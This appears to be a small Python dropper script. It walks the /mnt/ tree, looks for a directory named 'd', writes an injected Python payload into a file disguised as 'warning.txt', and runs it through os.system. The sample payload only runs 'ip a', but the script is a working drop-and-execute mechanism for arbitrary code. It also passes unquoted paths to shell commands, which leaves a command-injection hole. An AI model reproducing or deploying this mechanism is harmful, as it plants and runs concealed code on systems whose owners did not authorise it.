import os


packet = {
    'do' : "import os\nos.system('ip a')",
    'packet_name' : 'warning.txt',
    'start_from' : '/mnt/',
    'looking_for' : 'd'
}


_inject = packet['do']
_script_name = packet['packet_name']
rootdir = packet['start_from']
_looking_for = packet['looking_for']

for subdir, dirs, files in os.walk(rootdir):
    for dir in dirs:
        if dir == _looking_for:
            _path=os.path.join(subdir)
            os.system(f'touch {_path}/{dir}/{_script_name}')
            with open(f'{_path}/{dir}/{_script_name}', mode='w', encoding='utf-8') as f:
                f.write(str(_inject))
            f.close()
            os.system(f'python3 {_path}/{dir}/{_script_name}')
            exit(1)